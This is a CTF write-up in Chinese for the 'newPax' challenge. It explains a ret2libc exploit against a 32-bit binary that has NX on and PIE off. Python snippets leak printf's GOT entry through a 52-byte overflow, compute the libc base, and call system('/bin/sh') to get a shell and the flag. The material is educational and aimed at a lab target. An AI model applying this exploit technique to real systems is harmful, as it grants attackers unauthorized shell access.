# newPax
跟roprop差不多,也是簡單的ret2lib問題,只是是x86,同樣先看一下security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE沒開,表示我們可以找到正確的address跟plt.got table.


稍微disas 看一下發現沒有什麼可以直接用的function,再看一下plt table,這一次沒有puts@plt,但是還有printf,我們同樣可以利用printf function來leak libc address,然後算出base address,再得到system的address.

我們要進行兩次overflow,第一次利用printf function印出printf在got table的address,得到libc這次執行的address,由於每次執行base address都不一樣,所以我們要跳回到main的起點再運行一次程式，這樣base address仍會一樣.

第一次的payload:
```
...
align_gadget = 0x080483ba # ret;
# align
payload = b'A'*52 + p32(plt_printf) + p32(main) + p32(got_printf)  
...
```
透過ghidra或是gdb可以得到overflow的offset是52 bytes,由於x86沒有stack alignment的問題,所以直接呼叫printf function印出printf在got table上記錄的address,扣掉printf function在libc中的offset就能得到base address,再加上system的offset就是system的address.

透過以下code得到base address跟system function address:
```
...
libc_printf = proc.recvline()
# leak base address
libc_printf = u32(libc_printf[:-1].ljust(4, b'\x00')[0:4])
libc_base = libc_printf - libc.symbols['printf'] 
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search('/bin/sh').next()
...
```
再進行第二次的overflow,這一次只要利用之前得到的system function address呼叫system("/bin/sh"),就可以得到command line.
```
...
payload = b'A'*52 + p32(libc_system) + b'aaaa' + p32(libc_binsh)
...
```
執行exploit.py得到flag:
```
darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
```
